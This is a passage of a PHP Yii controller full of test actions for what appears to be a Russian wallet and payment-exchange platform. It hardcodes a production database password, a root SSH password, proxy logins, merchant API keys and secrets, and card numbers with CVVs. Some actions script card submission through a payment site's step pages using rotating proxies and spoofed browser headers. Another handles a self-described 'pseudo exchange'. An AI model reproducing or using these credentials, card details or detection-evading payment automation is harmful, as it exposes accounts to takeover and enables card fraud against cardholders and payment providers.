		]);

		$data = CHtml::listData($data, 'id', 'login');

		echo "<option value=''>Select User</option>";
		foreach($data as $value => $login)
		{
			echo CHtml::tag('option', ['value' => $value], CHtml::encode($login), true);
		}
	}


	public function actionAddInfo()
	{
		$bot = MerchantWallet::getYandexBot();
		$walletData = $bot->p2pInvoiceGeneration(100, 410019822094815);

		var_dump($walletData);die;

		if(!$bot::$lastError)
		{
			if($walletData)
				foreach($walletData as $wallet)
				{
					/**
					 * @var MerchantUser $merchantUser
					 */
					$merchantUser = MerchantUser::model()->findByAttributes(['internal_id'=>$wallet['merchant_user_id']]);

					if($model = MerchantWallet::model()->findByAttributes(['login'=>$wallet['tel']]))
					{
						/**
						 * @var self $model
						 */
						$model->date_check = time();
						$model->balance = $wallet['rub'];
						$model->merchant_user_internal_id = $wallet['merchant_user_id'];
						if($merchantUser)
						{
							$merchantUser->balance_qiwi = $wallet['rub'];
							$model->user_id = $merchantUser->uni_user_id;
							$model->client_id = $merchantUser->uni_client_id;
							$model->merchant_user_id = $merchantUser->id;
							$model->enabled = 1;
						}
						if($wallet['qiwi_blocked'] == 1)
							$model->error = 'blocked';

						foreach($freeCardsArr as $card)
						{
							if($card['wallet_name'] == $wallet['wallet_name'])
							{
								prrd('yes');
								toLogRuntime('Добавлена информация о карте');
								$model->card_number = $card['card_number'];
							}
						}

						$model->update();
						continue;
					}

					$model = new MerchantWallet;
					$model->login = $wallet['tel'];
					$model->merchant_user_internal_id = $wallet['merchant_user_id'];
					$model->date_add = time();
					$model->date_check = time();
					$model->balance = $wallet['rub'];
					$model->status = 'full';
					$model->limit_in = 2000000;
					$model->limit_out = 2000000;

					foreach($freeCardsArr as $card)
					{
						if($card['wallet_name'] == $wallet['wallet_name'])
						{
							toLogRuntime('Добавлена информация о карте');
							$model->card_number = $card['card_number'];
						}
					}

					$model->wallet_name =  $wallet['wallet_name'];
					if($merchantUser)
					{
						$model->user_id = $merchantUser->uni_user_id;
						$model->client_id = $merchantUser->uni_client_id;
						$model->merchant_user_id = $merchantUser->id;
						$model->enabled = 1;
						$merchantUser->balance_qiwi = $wallet['rub'];
						$merchantUser->save();
					}

					$model->save();
				}
		}
		else
			return false;
	}

	public function actionQiwiExchange()
	{
		$btcInComment = "&btc=12fVdGzZpVoe4E9MUtCzXa4NNjZ6rTGKLL";

		$userId = 309;
		$amount = $amountRub = 10;

		$amountBtc = 0.04;
		$orderId = 11212;

		$newComment = 'Обменная операция №';
		$urlQiwi = QiwiYandex::getPayUrl($userId, $amount);

		$successUrl = $failUrl = '';

		$postData = "qiwi_link=".base64_encode($urlQiwi)."&success_link=".base64_encode($successUrl)."&fail_link="
			.base64_encode($failUrl)."&qiwi=".$amountRub."&bit=".$amountBtc."&order_id=".$orderId;


		//TODO: решить по проценту для киви, пока что 0 поставил
		$postData .= '&percent=0';


		$postData .= "&btc=1NeJEFzY8PbVS9RvYPfDP93iqXxHjav791";
		//ключ API псевдо обмена
		$cfg = cfg('newYandexPayYm');
		$key = $cfg['exchangeKeyBytexcoin'];

		$hash = md5($postData.$key);

		$url = 'https://bitexcoin.ru/api.php?key='.$hash;

		$sender = new Sender;
		$sender->followLocation = false;
		//$sender->proxyType = 'http';

		$sender->timeout = 30;
		$content = $sender->send($url, $postData);

		//бывает сервер тупит и снова ждет запрос
		if($sender->info['httpCode'][0] == 100)
			$content = $sender->send($url, $postData);

		$arr = json_decode($content, true);

		prrd($arr);

		/**
		 * ответ: '.Tools::arr2Str($arr)
		.', httpCode='.$sender->info['httpCode'][0]);
		 */

	}

	public function actionInfo()
	{
		prrd(MerchantWallet::addInfo());
	}

	public function actionQiwiYandexConfirm()
	{
		$json = '{"key":"testtest","method":"ConfirmPayment","withdraw_amount":"7.80","amount":"7.01","sender":"\u0411\u0430\u043d\u043a","operation_id":"606751411761026004","datetime":"2019-03-24T17:03:31+03:00","wallet":"410016445373711","notification_type":"p2p","codepro":"false","unaccepted":"false","currency":"643"}';

		$requestArr = json_decode($json, true);

		if($requestArr['unaccepted'] !== 'false' or $requestArr['currency'] !== '643')
		{
			toLogError('actionConfirmNewYandexPayment неверные параметры');
			return false;
		}

		$params = [
			'amount' => $requestArr['withdraw_amount'],
			'number' => ($requestArr['notification_type'] == 'card-incoming') ? 'card' : $requestArr['sender'],
			'paymentId' => $requestArr['operation_id'],
			'orderId' => $requestArr['label'],
			'notificationType' => $requestArr['notification_type'],
			'wallet' => $requestArr['wallet'],
			'amount1' => $requestArr['amount'],
		];

		if(NewYandexPay::confirmPayment($params))
			echo 'OK';
		else
			echo 'error: '.NewYandexPay::$lastError;
	}

	public function actionClean1()
	{
		//ManagerApiRequest::clean();
		//NewYandexPay::startCancelOrders();
	}

	public function actionCache()
	{
		//var_dump(Yii::app()->cache->get('name1123123123123'));
		//var_dump(Yii::app()->cache->set('name1123123123123', 'value', 30));
		var_dump(Yii::app()->cache->get('name1123123123123'));
		//var_dump(Yii::app()->cache);
	}

	public function actionFilemtime()
	{
		$file = '/var/www/univer/data/www/qiwionline.cc/protected/runtime/cache/7df150759d64c8c083e7304ccde828fe.bin';

		echo date('d.m.Y H:i:s', filemtime($file));

		var_dump(time() - filemtime($file));
	}


	/**
	 * для тестирования ApiStore
	 */
	public function actionApiStore()
	{
		//если в запросе не передано то берем отсюда
		$apiKey = 'DRHYTDDKMNHUFRRK';

		$cfg = cfg('apiStore');

		$params = $_POST['params'];

		$url = $cfg['host'].'/'.(($params['debug']) ? 'test.php' : 'index.php').'?r=apiStore';

		if($_POST['submit'])
		{
			$_SESSION['apiStorePost'] = $params['postData'];
			$_SESSION['apiStoreDebug'] = $params['debug'];

			$postData = json_decode($params['postData'], true);

			//добавить ключ если нет
			if(!$postData['key'])
				$postData['key'] = $apiKey;

			$user = User::model()->findByAttributes(['api_key' => $postData['key']]);

			if(!$user)
				return false;

			$apiSecret = $user->api_secret;

			$hashParams = $postData;
			unset($hashParams['hash']);

			//добавить хеш к запросу, ести нет
			if(!$postData['hash'])
				$postData['hash'] = ApiStoreController::hash($hashParams, $apiSecret);

			$postDataEncoded = json_encode($postData);

			$sender = new Sender;
			$sender->followLocation = false;
			$content = $sender->send($url, $postDataEncoded);

			if($params['debug'])
			{
				echo 'запрос: '.$postDataEncoded."\n";

				echo 'ответ: '.$content."\n";

				if($json = @json_decode($content, true))
					print_r($json);
			}
			else
				echo $content;

			YII::app()->end();
		}
		else
		{
			$params['postData'] = $_SESSION['apiStorePost'];
			$params['debug'] = $_SESSION['apiStoreDebug'];
		}

		$this->render('apiStore', [
			'methods' => ApiStoreController::getAllowedMethods(),
			'params'=>$params,
		]);
	}

	public function actionBlockio()
	{
		$config = cfg('apiStore');
		$bot = Blockio::getInstance($config['blockioKey'], $config['blockioSecret']);
		$bot->withdrawPriority = config('blockio_withdraw_priority');

		var_dump($balanceBtc = $bot->getBalance());
	}

	public function actionExmo()
	{
		//$exmo = Yii::app()->exmoApi;

		/**
		 * @var ExmoApi $exmo
		 */

		//echo $exmo->getRate('BTC_USD', 'buy');
		//print_r($exmo->getTicker('BTC_USD'));
		//echo $exmo->error;

		ClientCalc::parseExmoLastPrice();

	}

	//очистка бд от старых данных
	public function actionClearDb()
	{

	}

	//тест распределения выдачи кошельков
	public function actionSim()
	{
		$account = SimAccount::getModel(['login'=>'9775092385']);
		$account->updateInfo();

		for($i=0; $i<=20; $i++)
		{
			$account = SimAccount::getWallet(rand(20, 3000), 877);

			if(!$account)
				die(SimAccount::$lastError);

			echo "
				\n{$account->login}:  balance {$account->balance}, balance_wait {$account->balance_wait}"
				.", limit_in {$account->limit_in}";
		}
	}

	public function actionSelenium()
	{
		$threads = [
			[
				'url'=>'https://188.138.57.110/requestInfo.php',
				'browser'=>'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:53.0.1) Gecko/20500302 Firefox/53.0.1',
				'proxy'=>'av3oHPEjmS:EkaterinaUrahova@78.155.205.116:42070',
				'userId'=>'user1',
			],

			[
				'url'=>'https://188.138.57.110/requestInfo.php',
				'browser'=>'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:53.0.1) Gecko/20500302 Firefox/53.0.2',
				'proxy'=>'av3oHPEjmS:EkaterinaUrahova@78.155.205.116:42070',
				'userId'=>'user2',
			],

			[
				'url'=>'https://188.138.57.110/requestInfo.php',
				'browser'=>'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:53.0.1) Gecko/20500302 Firefox/53.0.3',
				'proxy'=>'av3oHPEjmS:EkaterinaUrahova@78.155.205.116:42070',
				'userId'=>'user3',
			],

		];

		$sender = new Sender;
		$sender->timeout = 120;


		$apiUrl = 'https://94.140.125.237/artur/';
		$key = 'testtest';
		$method = 'testThread';

		$urls = [];
		$postData = [];

		foreach($threads as $thread)
		{
			$urls[] = $apiUrl;
			$postData[] = http_build_query(array_merge($thread, [
				'key' => $key,
				'method' => $method,
			]));
		}

		print_r($sender->send($urls, $postData));
		die;
	}

	public function actionBotRequest()
	{
		$cfgCurl = [
			'url'=>'https://188.138.57.110/requestInfo.php',
			'browser'=>'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:53.0.1) Gecko/20500302 Firefox/53.0.1',
			'proxy'=>'av3oHPEjmS:EkaterinaUrahova@78.155.205.116:42070',
			'userId'=>'user1',
		];
		$cfgSelenium = [
			'url'=>'https://188.138.57.110/requestInfo.php',
			'browser'=>'Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:53.0.1) Gecko/20500302 Firefox/53.0.1',
			'proxy'=>'av3oHPEjmS:EkaterinaUrahova@78.155.205.116:42070',
			'userId'=>'user2',
		];

		$sender = new Sender;

		$sender->useCookie = true;
		$sender->followLocation = false;

		$sender->additionalHeaders = [
			'User-Agent: '.$cfgCurl['browser'],
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'DNT: 1',
			'Upgrade-Insecure-Requests: 1',
			'Pragma: no-cache',
			'Cache-Control: no-cache',
		];

		$contentCurl = $sender->send($cfgCurl['url'], false, $cfgCurl['proxy']);

		echo "\n\n Curl content: \n".$contentCurl;

		//теперь селеном
		$apiUrl = 'https://94.140.125.237/artur/';

		$contentSelenium= $sender->send($apiUrl, http_build_query(array_merge($cfgSelenium, [
			'key' => 'testtest',
			'method' => 'request',
		])));

		echo "\n\n Selenium content: \n".$contentSelenium;
	}

	public function actionBrowserList()
	{
		$file = DIR_ROOT.'protected/config/simBrowsers.txt';
		$replace = 'ru-RU';

		if(!$rows = file($file))
			die('error1');

		foreach($rows as $row)
		{
			$row = trim($row);

			if(strlen($row) < 100)
				continue;

			if(preg_match('!(.+?) \((.+?); (.+?); (.+?); (.+?)\) .+!', $row, $match))
				$row = str_replace($match[5], $replace, $row);

			echo $row."\n";
		}
	}

	public function actionApiSelenoid()
	{
		$config = Yii::app()->getModule('sim')->config;

		$sender = new Sender();
//		$postData = http_build_query([
//			'key' => $config['selenoidApiKey'],
//			'method' => 'test',
//		]);
//
//		echo $sender->send($config['selenoidApiUrl'], $postData);

		$status = [];
		echo "\n status: ";
		print_r(json_decode($sender->send('http://199.192.30.25:4444/status'), true));
	}

	/**
	 * @return array|bool
	 */
	public function actionParseProxy()
	{
 		$proxyStr = 'http://MWOYEm:7Lv9JlK0cS@45.140.55.18:2200';

		if(preg_match('!(http|socks5)://(([^:]+?):([^@]+?)@|)(.+?):(\d{2,7})!', $proxyStr, $match))
		{
			$proxyArr = [
				'type'=>$match[1],
				'login'=>$match[3],
				'pass'=>$match[4],
				'ip'=>$match[5],
				'port'=>$match[6],
			];
		}

		prrd($proxyArr);
	}

	public function actionParseBrowser()
	{
		$browserStr = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A';

		if(preg_match('!(.+?) \((.+?); (.+?); (.+?); (.+?)\) .+!', $browserStr, $match))
		{
			prrd($match);
		}

		die('error');
	}

	public function actionLaravelApi()
	{
		$urlApi = 'https://as-getpay.info/pay/v2/getUrl';
		$cfg = cfg('storeApi');
		$sender = new Sender;
		$sender->followLocation = true;
		$sender->proxyType = $cfg['notificationProxyType'];
		$sender->useCookie = false;

		$key = '2yuie8afz4T49SDG';
		$secret = '4u8TIkUu4sOLqOoG4lSheyTBvXlYZfo5';

		$params = [
			'amount' => 10,
		];

		$postData = 'key='.$key.'&amount='.$params['amount'];


		$contentJson = $sender->send($urlApi, $postData);

		$content = json_decode($contentJson,1);
	}

	public function actionBack()
	{
		$back = new DataBackup;

		//$backupFolder, $backupName, $targetDirWithFiles, $delayDelete, $dbHost, $dbUser,
		//	$dbPassword, $dbName, $maxTableSizeMB, $mailTo, $mailFrom, $remoteServerIp,
		//	$remoteServerPort, $remoteBackupFolder, $remoteServerUserName, $remoteServerPass

		$back->backupFolder = '/var/www/backup';
		$back->backupName = 'testBackNow';
		$back->backupNameFile = 'testBackNewFile';
		$back->backupNameSql = 'testBackNewSql';
		$back->targetDirWithFiles = '/var/www/univer/data/www/qiwionline.cc';
		$back->delayDelete = 365;
		$back->dbHost = 'localhost';
		$back->dbUser = 'uni';
		$back->dbPassword = '0F9z0J7H3jcgAodTEOjK';
		$back->dbName = 'uni_prod';
		$back->maxTableSizeMB = 200;
		$back->mailTo = 'test';
		$back->mailFrom = 'test';
		$back->remoteServerIp = '63.250.45.143';
		$back->remoteServerPort = '22';
		$back->remoteBackupFolder = '/var/www/back';
		$back->remoteServerUserName = 'root';
		$back->remoteServerPass = 'br72oKz0YCM5Nuo38O';
		$back->manipulateBackup();
		prrd($back);
	}

	public function actionTestUpdateYad()
	{
		$result = [];
		$user = User::getModel(['id'=>850]);


//		if(!$this->request['orderId'])
//		{
//			$this->errorCode = self::ERROR_REQUEST;
//			$this->errorMsg = 'не указан orderId';
//			return $result;
//		}

//		$orderId = $this->request['orderId']*1;

		$models = NewYandexPay::getModels(0, 1571258638, 850);

//		prrd($models);

		foreach($models as $key=>$order)
		{
			/**
			 * @var NewYandexPay $order
			 */
			$payment = new PaySol('5da49bfa90a4ca72fc454d95', '6BrD5iMPG1hSZopK6HTjaYXsKtjyIsjw', 'GnTQv82Z0tq9fZhRKEVCkkpE2YTQTa0P');

			$progress = 0;
			if($order->remote_order_id)
			{
				sleep(5);
				$orderResult = $payment->getOrder($order->remote_order_id);

				$status = isset($orderResult->status) ? $orderResult->status : $order->status;

				if($status == 'succeed')
					$status = 'success';
				elseif($status == 'progress')
					$status = 'wait';
				elseif($status == 'failed')
					$status = 'error';

				$order->status = $status;

				$progress = ($orderResult->status == 'succeed') ? 100 : $orderResult->progress;

				$order->progress = $progress;
				$order->save();
			}
			else
				continue;

			$result[$key] = [
				'id' => $order->order_id,
				'amount' => $order->amount,
				'status' => $status,
				'progress' => $progress,
			];

		}
		prrd($result);

		return $result;
	}

	public function actionMd5()
	{
		prrd(hash('md2','VIP297462:JcxfJwL9YT@37.9.46.170:8080'));
	}

	public function actionSetWallet()
	{
//		prrd(config('newYandexPayInfoProductWalletStr'));
//		prrd(config('newYandexPayInfoProductWalletStr'));
		config('newYandexPayWallet', '410019241441984');
		prrd(config('newYandexPayWallet'));
	}

	public function actionPhantomJs($jsContent=false)
	{
		//test
		set_time_limit(30);
		$jsContent = file_get_contents(__DIR__.'/test/test.js');

		$tmpDir = DIR_ROOT.'protected/runtime/jsExec';
		$tmpFile = $tmpDir.'/'.md5($jsContent).rand(1, 1000).'.js';

		if(file_put_contents($tmpFile, $jsContent))
		{
			register_shutdown_function(function($tmpFile){
				unlink($tmpFile);
			}, $tmpFile);

			var_dump(exec('phantomjs '.$tmpFile));
		}
		else
			return false;
	}

	public function actionExpaPay()
	{
		$apiParams = [
			'key' => '5dcbe7c75c3b67cb3f9a5dac',
			'secret' => 'b1IyMpDTS5WUJ1HElOiOAA',
			'proxy' => '',
		];

//		$payParams = json_decode('{
//"account_id": "5c1f8d7f45e5f31712487831", "amount": 4600.00,
//"payer": {
//"contact_info": "tsarvanya@kremlin.ru", "ip_address": "79.143.88.34", "wallet": {
//"card_number": "4221045566578282", "expiry_date": "06/20", "holder_name": "IVAN TSAREVYTSCH", "security_code": "042",
//"type": "creditcard" }
//}, "payee": {
//"wallet": {
//"card_number": "5543735484626654", "type": "creditcard"
//} }
//}', true);

		$api = new ExpaPay($apiParams);
//		var_dump($api->card2card($payParams));

//		$payParams = [
//
//		];

//		var_dump($api->balance($payParams));

		$payParams = [
			'amount' =>'25.00',
			'payer' => [
				'email' => 'tsarvanya123@gmail.com',
				'ip_address' => '79.143.88134',
				'wallet' => [
					'card_number' =>'4890494656384005',
					'expiry_date' =>'11/20',
					'holder_name' =>'Ivan TsarevytschER',
					'security_code' =>'489',
					'type' => 'creditcard',
				],
			],
			'payee' => [
				'wallet' => [
					'card_number' =>'4890494622250132',
					'type' => 'creditcard',
				],
			],
		];

		var_dump($api->card2card($payParams));
	}

	public function actionA3Pay()
	{
		$apiParams = [
			'key' => 'n1mJGXa6jWrV',
//			'secret' => __DIR__.'/test/tarelagov@tutanota.com-test-ssl.crt',
//			'secret' => __DIR__.'/test/tarelagov@tutanota.com-test-pf.crt',
//			'secret' => __DIR__.'/test/test.crt',
//			'secret' => __DIR__.'/test/request.csr',
//			'secret' => __DIR__.'/test/tarelagov@tutanota.com.p12',
			'secret' => __DIR__.'/test/tarelagov@tutanota.com.ssl.p12',
			'proxy' => '',
		];

		$api = new A3Pay($apiParams);

		$params = [

		];

		var_dump($api->test());
	}

	public function actionSoap()
	{
		phpinfo();

	}

	public function actionDatePeriod()
	{
		$cfg = cfg('yandexAccount');

		$account = YandexAccount::getModel(['id'=>38]);
//		prrd($account->balance);

		$begin = new DateTime(date('01.m.Y', $account->date_add));
		$end = new DateTime(date('d.m.Y 23:59:59', time()+2678400));
		$end->modify('last day of this month');
		$interval = new DateInterval('P1M');

		$period = new DatePeriod($begin, $interval, $end);

		//получаем массив дат с интервалом 1 месяц, попадающих в период
		$periodArr = [];
		foreach($period as $date)
		{
			$periodArr[] = [
				'dateStr' => $date->format('d.m.Y H:i').'',
				'month' => $month = $date->format('m')*1,
				'year' => $year = $date->format('Y')*1,
			];
		}

		$thisMonthLimit = $cfg['limitInMonth'];

		$stats = [];
		$balance = [];

		foreach ($periodArr as $key=>$date)
		{
			if($key == count($periodArr)-1)
				break;

			$statsMonth = $account->getTransactionStats(strtotime($date['dateStr']), strtotime($periodArr[$key + 1]['dateStr']));
			$lastLimit = $cfg['limitInMonth'] - $statsMonth['amountOut'];

			$stats[] = [
				'limit' => $lastLimit,
				'balance' => $statsMonth['amountIn'] - $statsMonth['amountOut']
			];

			/**
			 * @var Model $model
			 */
//			if(!$model = YandexAccountLimit::getModel(
//				[
//					'month'=>$date['month'],
//					'year'=>$date['year'],
//					'wallet_id'=>$account->id
//				]))
//			{
//				$model = new YandexAccountLimit;
//				$model->scenario = YandexAccountLimit::SCENARIO_ADD;
//				$model->month = $date['month'];
//				$model->year = $date['year'];
//				$model->in_amount_per_month = $statsMonth['amountIn'];
//				$model->limit = $lastLimit;
//				$model->date_calc = time();
//				$model->wallet_id = $account->id;
//				$model->save();
//			}
//
//			if($lastLimit < 0)
//				$thisMonthLimit += $model->limit;
		}
		var_dump($periodArr);
prrd($stats);

		var_dump($begin);
		var_dump($end);

		prrd($thisMonthLimit);

	}

	public function actionSoap2()
	{
		$baseUrl = 'https://devpfront2.a-3.ru/ProcessingFront/ProcessingFrontWS?wsdl';
//		$baseUrl = 'https://www.google.com';
		$sender = new Sender;
		$sender->followLocation = false;
		$xmlPostString = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:tnt="http://www.a-3.ru/tnt/">
    <soapenv:Header/>
    <soapenv:Body>
        <tnt:initPaymentRequest>
            <systemID>TEST_SYSTEM</systemID>
            <paymentType>CARD</paymentType>
            <currency>643</currency>
            <amount>325.25</amount>
            <fee>15.25</fee>
            <orderID>100256</orderID>
            <orderDesc>Тестовый платеж на сумму 325.25 руб.</orderDesc>
            <phone>9161231212</phone>
            <urlSuccess>https://www.a-3.ru/</urlSuccess>
            <urlFail>https://www.a-3.ru/</urlFail>
        </tnt:initPaymentRequest>
    </soapenv:Body>
</soapenv:Envelope>';

		$sender->additionalHeaders = [
			"Content-type: text/xml;charset=\"utf-8\"",
			"Accept: text/xml",
			"Cache-Control: no-cache",
			"Pragma: no-cache",
//			"SOAPAction: http://connecting.website.com/WSDL_Service/GetPrice",
			"Content-length: ".strlen($xmlPostString),
		];
//		$postData = '{
//		"header":{
//				"version":"0.1",
//				"txName":"listUsers",
//				"lang":"EN"
//		  }
//		}';

		$proxy = 'fl90743:InJGGOM6x7@ru1.proxik.net:80';

		$content = $sender->send($baseUrl, $xmlPostString, $proxy);
		print_r($content);
		print_r($sender->info);
		die;
	}

	public function actionTest()
	{
		$url = rawurldecode('https://pfront.a-3.ru/ProcessingFront/step1.jsp?sid=9bd2047b-20a3-4529-a289-03d4f61a6408');
		$sender = new Sender;
		$sender->followLocation = true;

		$content = $sender->send($url, false, $proxy);

		if(!preg_match("!name: 'transactionId', value: '(\d+)'!iu", $content, $matches))
		{
			prrd('error 1');
		}

		if(!preg_match("!id=t:(\d+)&key=(.+?)'!iu", $content, $matches2))
		{
			prrd('error 2');
		}

		$transactionId = $matches[1];
		$id = $matches2[1];
		$key = $matches2[2];

		$url = 'https://pfront.a-3.ru/ProcessingFront/step2.jsp';

		$cardNumber = '4890494691698955';
		$cardMonth = '10';
		$cardYear = '20';
		$cardExp = $cardYear.$cardMonth;
		$cvv = '256';

		$postData = 'transactionId='.$transactionId.'&cardNumber='.$cardNumber.'&cardExp='.$cardExp.'&cardCVV='.$cvv.'&cardOwner=CARD+OWNER&phone=&email=';

		$sender->additionalHeaders = [
			'Host: pfront.a-3.ru',
			'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0',
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/x-www-form-urlencoded',
			'Content-Length: '.strlen($postData),
			'DNT: 1',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, $postData, $proxy);

		if(!preg_match('!Устанавливается связь с банком!iu', $content))
			prrd('error step3');

		$tryCount = 10;

		for($i = 0; $i < $tryCount; $i+=1)
		{
			sleep(2);
			$url = 'https://pfront.a-3.ru/ProcessingFront/orderStatus.jsp?orderId=t%3A'.$id.'&systemId=SHTRAFYONLINE.TAXES&_='.round(microtime(true) * 1000);

			$sender->additionalHeaders = null;

			$sender->additionalHeaders = [
				'Host: pfront.a-3.ru',
				'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0',
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'X-Requested-With: XMLHttpRequest',
				'DNT: 1',
				'Connection: keep-alive',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
				];


			$content = $sender->send($url, false, $proxy);

			if($content == 1)
				break;
			else
				continue;

		}

		if($content*1 !== 1)
			prrd('error step 4');

		$url = 'https://pfront.a-3.ru/ProcessingFront/pareqFrame.jsp?transactionId='.$transactionId;

		$sender->additionalHeaders = null;

		$sender->additionalHeaders = [
			'Host: pfront.a-3.ru',
			'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0',
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'X-Requested-With: XMLHttpRequest',
			'DNT: 1',
			'Connection: keep-alive',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, false, $proxy);

		if(!preg_match('!name="PaReq" style="display:none">(.+?)</textarea>!iu', $content, $matches))
			prrd('error step 5');

		$paReq = $matches[1];

		if(!preg_match('!name="TermUrl" value="(.+?)"!iu', $content, $matches))
			prrd('error step 6');

		$termUrl = $matches[1];


		if(!preg_match('!name="MD" value="(.+?)"!iu', $content, $matches))
			prrd('error step 7');

		$md = $matches[1];

		$result = [
			'paReq' => $paReq,
			'termUrl' => $termUrl,
			'md' => $md,
		];

		var_dump($result);

		exit('test');
	}









	public function actionLimitTest()
	{
		$account = YandexAccount::getModel(['id'=>38]);
//		prrd($account->balance);
		prrd($account->getTransactionStats(Tools::startOfMonth(), time()));
		$cfg = cfg('yandexAccount');

		$account = YandexAccount::getModel(['id'=>38]);
		//		prrd($account->balance);

		$begin = new DateTime(date('01.m.Y', $account->date_add));
		$end = new DateTime(date('d.m.Y 23:59:59', time()+2678400));
		$end->modify('last day of this month');
		$interval = new DateInterval('P1M');

		$period = new DatePeriod($begin, $interval, $end);

		//получаем массив дат с интервалом 1 месяц, попадающих в период
		$periodArr = [];
		foreach($period as $date)
		{
			$periodArr[] = [
				'dateStr' => $date->format('d.m.Y H:i').'',
				'month' => $month = $date->format('m')*1,
				'year' => $year = $date->format('Y')*1,
			];
		}

		$thisMonthLimit = $cfg['limitInMonth'];

		$stats = [];
		$balance = [];

		foreach ($periodArr as $key=>$date)
		{
			if($key == count($periodArr)-1)
				break;

			$statsMonth = $account->getTransactionStats(strtotime($date['dateStr']), strtotime($periodArr[$key + 1]['dateStr']));
			$lastLimit = $cfg['limitInMonth'] - $statsMonth['amountOut'];

			$stats[] = [
				'limit' => $lastLimit,
				'balance' => $statsMonth['amountIn'] - $statsMonth['amountOut']
			];

			/**
			 * @var Model $model
			 */
			//			if(!$model = YandexAccountLimit::getModel(
			//				[
			//					'month'=>$date['month'],
			//					'year'=>$date['year'],
			//					'wallet_id'=>$account->id
			//				]))
			//			{
			//				$model = new YandexAccountLimit;
			//				$model->scenario = YandexAccountLimit::SCENARIO_ADD;
			//				$model->month = $date['month'];
			//				$model->year = $date['year'];
			//				$model->in_amount_per_month = $statsMonth['amountIn'];
			//				$model->limit = $lastLimit;
			//				$model->date_calc = time();
			//				$model->wallet_id = $account->id;
			//				$model->save();
			//			}
			//
			//			if($lastLimit < 0)
			//				$thisMonthLimit += $model->limit;
		}
		var_dump($periodArr);
		prrd($stats);

		var_dump($begin);
		var_dump($end);

		prrd($thisMonthLimit);

	}


	public function actionIpProxy()
	{
//		$proxy = 'fl90743:InJGGOM6x7@ru1.proxik.net:80';
		$proxy = 'v-gordyy_list_ru:P6CM7JUQ@be-2m-4.airsocks.in:12756';
		$sender = new Sender;
		$sender->followLocation = true;
		$sender->timeout = 180;
		$content = $sender->send('www.2ip.ru', false, $proxy);

		prrd($content);
	}

	public function actionSha1()
	{
		$text = "Il1dUttOy0pIYTbTEST2016-09-01";

		$text = utf8_encode($text);

		$md5 = md5($text, true);

		$encoded = base64_encode($md5);

		prrd($encoded);
	}

	public function actionA3Basket()
	{
		//Other__Payments

		$proxy = 'le95olD7Zx:xlcdfbon@213.159.202.214:55004';
		$cardNumber = '4890494682626304';
		$userAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0';
		$result = [];

		set_time_limit(120);

		$runtimePath = DIR_ROOT.'protected/runtime/';

		if(!file_exists($runtimePath.'cardPay/'))
			mkdir($runtimePath.'cardPay/');

		if(!file_exists($runtimePath.'cardPay/cookie/'))
			mkdir($runtimePath.'cardPay/cookie/');

		$sender = new Sender;
		$sender->useCookie = true;
		$sender->cookieFile = $runtimePath.'cardPay/cookie/'.md5($cardNumber).'.txt';
		$sender->pause = 1;
		$sender->followLocation = false;

		$url = 'https://www.a-3.ru/basket';
		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: www.a-3.ru',
			$userAgent,
			'Accept: */*',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Connection: keep-alive',
			'Referer: https://www.a-3.ru/pay_mobile/',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, null, $proxy);
		prrd($content);
	}
	
	public function actionYadClassic()
	{
		//наша ссылка яда
